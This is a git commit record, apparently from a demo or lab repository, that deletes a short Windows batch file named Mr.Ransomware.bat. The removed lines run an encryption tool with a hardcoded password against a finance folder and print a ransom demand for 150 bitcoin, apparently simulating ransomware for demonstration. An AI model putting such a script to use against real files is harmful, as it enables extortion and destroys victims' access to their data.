dfc97b69a40c1b9bd88e5e4315929f9bec49b9b8
janedoedemolab <88815482+janedoedemolab@users.noreply.github.com>
2022-10-06 18:46:04 +0800

    Delete Mr.Ransomware.bat

--- Mr.Ransomware.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-
-cd \
-cd c:\temp
-Crypt.exe -i -e -p Cyberark1 file c:\temp\finance
-echo.
-Echo "Your files has been encrypted. To restore back your files, transfer 150 bitcoin to this XXX account"
-echo.
